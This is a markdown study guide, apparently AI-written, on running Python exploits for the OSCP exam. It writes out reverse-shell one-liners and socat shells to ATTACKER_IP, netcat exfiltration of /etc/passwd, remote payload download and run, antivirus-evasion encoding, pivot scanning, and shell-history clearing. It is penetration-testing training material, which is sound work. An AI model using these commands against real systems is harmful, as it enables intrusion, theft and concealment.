```markdown
# Complete OSCP Python Attack Guide - Comprehensive Exam Reference

This comprehensive guide integrates extensive research from Reddit, CSDN, Medium, and YouTube to provide a complete step-by-step reference for using Python exploits during your OSCP exam. Treat every script as a tool you must inspect, configure, and control.

## **1. Enhanced Mental Model**

**Core Principle:** Treat every script as a tool you must inspect, configure, and control. Know inputs, outputs, and whether it expects a callback (reverse) or creates a bind shell.

**Pre-Execution Questions:**
- What does this script actually do? (RCE, file read, privilege escalation)
- Does it need a listener? (reverse shell vs bind shell vs command execution)
- What parameters are required? (target IP, callback IP/port, file paths)
- What Python version does it expect? (python2 vs python3)
- Does it need special modules or dependencies?

## **2. Comprehensive Pre-Execution Checklist**

### **Phase 1: Script Analysis**
```
# Always read help first
python exploit.py -h
python3 exploit.py --help

# Inspect the script structure (first 100-120 lines are critical)
head -n120 exploit.py
cat exploit.py | grep -E "(import|def|class|if __name__|argparse)"

# Look for key indicators
grep -E "(reverse|bind|listener|callback|lhost|lport)" exploit.py
grep -E "(exec|command|cmd|shell|payload)" exploit.py
grep -E "(read|write|upload|download)" exploit.py
```

### **Phase 2: Compatibility Check**
```
# Check Python version requirement
head -1 exploit.py  # Look for #!/usr/bin/python vs python3

# Test basic syntax compatibility
python3 -m py_compile exploit.py  # Will show syntax errors

# Check for Python 2 vs 3 indicators
grep -E "(print |raw_input|urllib2|httplib)" exploit.py  # Python 2 patterns
grep -E "(print$$|input$$|urllib.request)" exploit.py   # Python 3 patterns
```

### **Phase 3: Dependency Management**
```
# Create isolated environment
python3 -m venv venv
source venv/bin/activate

# Install requirements if present
pip install -r requirements.txt

# Manual dependency installation for common modules
pip install requests urllib3 pwntools pycryptodome impacket

# For older scripts requiring Python 2
pip2 install requests urllib urllib2 httplib
```

## **3. Reverse vs Bind Shells: Connection Timing**

### **Reverse Shell Pattern (Most Common)**
**Target connects back to you - Start listener FIRST**

```
# Start listener before running exploit
nc -nvlp 4444
# or with better line editing
rlwrap nc -nvlp 4444
# or with socat for SSL/advanced features
socat -d -d tcp-listen:4444,reuseaddr,fork stdout
```

**How to Know Your Target Connected Back:**
- **Immediate Indicators:**
  ```
  Listening on 0.0.0.0 4444
  Connection received on [TARGET_IP] [RANDOM_PORT]  ← Success message
  ```
- **Test Connection Immediately:**
  ```
  whoami
  id
  hostname
  pwd
  ```
- **Verify Stable Connection:**
  ```
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  export TERM=xterm
  ```

### **Bind Shell Pattern**
**Target listens, you connect - Run exploit FIRST**

```
# Run exploit first (creates listener on target)
python3 exploit.py -t TARGET --bind-port 4444

# Then connect to target
nc TARGET 4444
```

### **Command Execution Pattern**
**No shell needed - Direct command execution**

```
# No listener required
python3 exploit.py -t TARGET --exec 'id; hostname; whoami'
python3 exploit.py -t TARGET --cmd 'cat /etc/passwd'
```

## **4. Typical Attack Patterns and Exact Commands**

### **Pattern 1: File Reading/Information Disclosure**
```
# Common file reading targets
python3 exploit.py -t TARGET --read /etc/passwd
python3 exploit.py -t TARGET --read /etc/shadow
python3 exploit.py -t TARGET --read /home/user/local.txt
python3 exploit.py -t TARGET --read /root/proof.txt

# Web application file reading
python3 exploit.py -u http://TARGET --file ../../../../etc/passwd
python3 exploit.py -u http://TARGET --file ../../../windows/system32/drivers/etc/hosts
```

### **Pattern 2: Remote Code Execution**
```
# One-off command execution (no listener needed)
python3 exploit.py -t TARGET --exec 'id; hostname; whoami'
python3 exploit.py -t TARGET --exec 'ps aux | grep root'
python3 exploit.py -t TARGET --exec 'find / -perm -4000 2>/dev/null'

# Reverse shell payload delivery
# Start listener first:
nc -nvlp 4444

# Then run exploit:
python3 exploit.py -t TARGET --lhost ATTACKER_IP --lport 4444 --shell
python3 exploit.py -u http://TARGET --callback ATTACKER_IP:4444
```

### **Pattern 3: Base64 Encoded Payloads**
```
# For environments with character filtering
payload='bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
b64payload=$(echo "$payload" | base64 -w0)

# Deliver encoded payload
python3 exploit.py -t TARGET --exec "echo $b64payload | base64 -d | bash"
python3 exploit.py -t TARGET --cmd "powershell -enc $(echo 'IEX...' | base64 -w0)"
```

### **Pattern 4: Credential Extraction**
```
# Scripts that extract SSH keys, passwords, tokens
python3 exploit.py -t TARGET --extract-creds > creds.txt
python3 exploit.py -t TARGET --dump-hashes > hashes.txt

# Use extracted SSH keys
chmod 600 extracted_key.pem
ssh -i extracted_key.pem user@TARGET
```

## **5. Connection Verification and Troubleshooting**

### **Connection Success Indicators**
✅ **Netcat shows:** `Connection received on [TARGET_IP] [PORT]`  
✅ **Commands execute:** `whoami`, `id`, `hostname` work  
✅ **Stable connection:** No immediate drops or hangs  
✅ **Interactive capability:** Can run `python3 -c 'import pty; pty.spawn("/bin/bash")'`

### **Troubleshooting Failed Connections**
```
# Network monitoring during exploit
tcpdump -i tun0 -n host TARGET_IP

# Try alternative callback ports
nc -nvlp 80    # HTTP port often allowed
nc -nvlp 443   # HTTPS port often allowed  
nc -nvlp 53    # DNS port sometimes allowed
nc -nvlp 8080  # Alternative HTTP port

# Test with different payload encodings
# URL encoding
python3 exploit.py -t TARGET --payload "%62%61%73%68%20%2d%69..."

# PowerShell encoding for Windows targets
powershell_payload = "powershell -nop -w hidden -e $(base64_encoded_command)"
```

### **Connection Drops Immediately**
**Common causes and solutions:**
```
# Antivirus detection - try encoded payloads
python3 exploit.py -t TARGET --payload "$(echo 'bash -i...' | base64)"

# Firewall blocking - try different ports
for port in 80 443 53 8080 22; do
    nc -nvlp $port &
    python3 exploit.py -t TARGET --lport $port
done
```

## **6. Script Modification and Adaptation**

### **Common Script Modifications**
```
# Copy script for modifications
cp exploit.py exploit.local.py

# Common edits needed:
# 1. Replace hardcoded IPs/ports
sed -i 's/192.168.1.100/TARGET_IP/g' exploit.local.py
sed -i 's/127.0.0.1/ATTACKER_IP/g' exploit.local.py

# 2. Fix Python version compatibility
sed -i 's/print /print(/g' exploit.local.py  # Add parentheses for Python 3
sed -i 's/raw_input/input/g' exploit.local.py  # Python 3 input function

# 3. Add debugging output
# Add these lines after imports:
import sys
print(f"[DEBUG] Target: {sys.argv}", file=sys.stderr)
```

### **Python 2 to Python 3 Conversion**
```
# Common conversions needed:

# Print statements
print "hello"          → print("hello")

# Input functions  
raw_input("prompt")    → input("prompt")

# String/bytes handling
response.read()        → response.read().decode('utf-8')

# HTTP libraries
import urllib2         → import urllib.request
urllib2.urlopen(url)   → urllib.request.urlopen(url)

# Exception syntax
except Exception, e:   → except Exception as e:
```

## **7. File Transfer and Shell Stabilization**

### **Method 1: HTTP Server Transfer**
```
# On attacker machine
python3 -m http.server 8000

# On target (after getting shell)
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./tmp/linpeas.sh
```

### **Method 2: Netcat Transfer**
```
# Transfer file TO target
# On attacker:
nc -nvlp 9001 < linpeas.sh
# On target:
nc ATTACKER_IP 9001 > /tmp/linpeas.sh

# Transfer file FROM target
# On attacker:
nc -nvlp 9001 > extracted_file.txt
# On target:
nc ATTACKER_IP 9001 < /etc/passwd
```

### **Shell Stabilization Techniques**
```
# Method 1: Python PTY (most common)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg  # (press Enter twice)

# Method 2: Script command
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm

# Method 3: Socat upgrade (if socat available)
# On attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On target:
socat exec:'bash -li',pty,stderr,setpgid,sigint,sane tcp:ATTACKER_IP:4444
```

## **8. Multi-Stage Exploitation Patterns**

### **Pattern 1: Initial Access → Privilege Escalation**
```
# Stage 1: Get initial shell
nc -nvlp 4444 &
python3 initial_exploit.py -t TARGET --lhost ATTACKER_IP --lport 4444

# Stage 2: Enumerate and escalate
python3 -c 'import pty; pty.spawn("/bin/bash")'
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# Stage 3: Use privilege escalation script
python3 privesc_exploit.py --target localhost --user current_user
```

### **Pattern 2: Web App → Internal Network Pivot**
```
# Stage 1: Web application exploit
python3 web_exploit.py -u http://TARGET/vulnerable.php --cmd whoami

# Stage 2: Upload reverse shell script
python3 web_exploit.py -u http://TARGET/upload.php --upload reverse.py
python3 web_exploit.py -u http://TARGET/reverse.py --trigger

# Stage 3: Pivot to internal network
# From web shell, scan internal network
python3 -c "
import socket
for i in range(1,255):
    try:
        socket.create_connection(('192.168.1.'+str(i), 22), timeout=1)
        print(f'192.168.1.{i}:22 open')
    except:
        pass
"
```

## **9. Template Python Scripts for OSCP**

### **Template 1: Basic HTTP Exploit**
```
#!/usr/bin/env python3
import requests
import sys
import argparse

def exploit(target, lhost=None, lport=None):
    try:
        # Your exploit logic here
        if lhost and lport:
            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        else:
            payload = "id"
        
        data = {'vulnerable_param': payload}
        response = requests.post(f"http://{target}/vulnerable.php", data=data)
        
        if response.status_code == 200:
            print("[+] Exploit sent successfully")
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("--lhost")
    parser.add_argument("--lport")
    args = parser.parse_args()
    
    exploit(args.target, args.lhost, args.lport)
```

### **Template 2: Socket-Based Exploit**
```
#!/usr/bin/env python3
import socket
import sys
import time

def exploit(target, port, command="id"):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target, port))
        
        # Send exploit payload
        payload = f"VULNERABLE_COMMAND {command}\r\n"
        s.send(payload.encode())
        
        # Receive response
        response = s.recv(4096).decode()
        print(f"[+] Response: {response}")
        
        s.close()
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 exploit.py <target> <port> [command]")
        sys.exit(1)
    
    target = sys.argv
    port = int(sys.argv)
    command = sys.argv if len(sys.argv) > 3 else "id"
    
    exploit(target, port, command)
```

## **10. Advanced Debugging and Troubleshooting**

### **Network-Level Debugging**
```
# Monitor all traffic to/from target
tcpdump -i tun0 -w capture.pcap host TARGET_IP

# Monitor specific port traffic
tcpdump -i tun0 port 4444

# Use Burp Suite as proxy for HTTP exploits
python3 exploit.py -t TARGET --proxy http://127.0.0.1:8080
```

### **Script-Level Debugging**
```
# Add debugging to any Python script
import logging
logging.basicConfig(level=logging.DEBUG)

# Add print statements for payload debugging
print(f"[DEBUG] Sending payload: {payload}")
print(f"[DEBUG] Target URL: {url}")
print(f"[DEBUG] Response status: {response.status_code}")
```

### **Common Error Resolution**
```
# Module not found errors
pip install missing_module
# or for Python 2
pip2 install missing_module

# Permission denied errors
chmod +x exploit.py

# SSL certificate errors
# Add to Python script:
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

# Connection refused errors
# Check if target port is actually open
nmap -p PORT TARGET_IP
```

## **11. Exam-Specific Considerations**

### **Evidence Collection**
```
# Always document successful exploitation
whoami && hostname && date
id && uname -a
ifconfig || ip a

# Capture proof files
cat /home/user/local.txt
cat /root/proof.txt

# Screenshot your successful exploitation
# Include: connection establishment, command execution, proof files
```

### **Time Management**
```
# Quick exploitation testing order:
# 1. Try script as-is first (2 minutes)
# 2. If fails, check for obvious issues (5 minutes)
# 3. If still fails, modify script (10 minutes maximum)
# 4. If still fails, try alternative exploit

# Don't spend more than 15-20 minutes on a single Python exploit
```

### **Safety and Cleanup**
```
# Clean up temporary files
rm /tmp/exploit.py /tmp/linpeas.sh

# Kill background listeners
killall nc
pkill -f "python.*exploit"

# Clear command history if needed
history -c
```

## **12. Quick Reference Commands (Copy/Paste Ready)**

### **Inspection Commands**
```
# Quick script analysis
python3 exploit.py -h
head -n50 exploit.py | grep -E "(import|def|argparse)"

# Dependency setup
python3 -m venv v && source v/bin/activate && pip install requests pwntools
```

### **Listener Commands**
```
# Standard listener
nc -nvlp 4444

# Enhanced listener with line editing
rlwrap nc -nvlp 4444

# Multi-port listener setup
for port in 4444 80 443 53; do nc -nvlp $port & done
```

### **Common Exploit Patterns**
```
# File reading
python3 exploit.py -t TARGET --read /etc/passwd

# Command execution  
python3 exploit.py -t TARGET --exec 'id; hostname'

# Reverse shell (start listener first!)
nc -nvlp 4444 &
python3 exploit.py -t TARGET --lhost ATTACKER_IP --lport 4444
```

### **Shell Upgrade Commands**
```
# Immediate shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg

# File transfer setup
python3 -m http.server 8000 &
```

---

**Remember: understand before you execute** - analyze the script, understand what it does, set up the proper listeners, and always verify your connections work before proceeding to post-exploitation activities.
```

Copy and paste this entire content into a `.md` file (like `oscp-python-guide.md`) and you'll have your complete OSCP Python exploitation reference guide ready for use during your exam preparation and the actual exam.
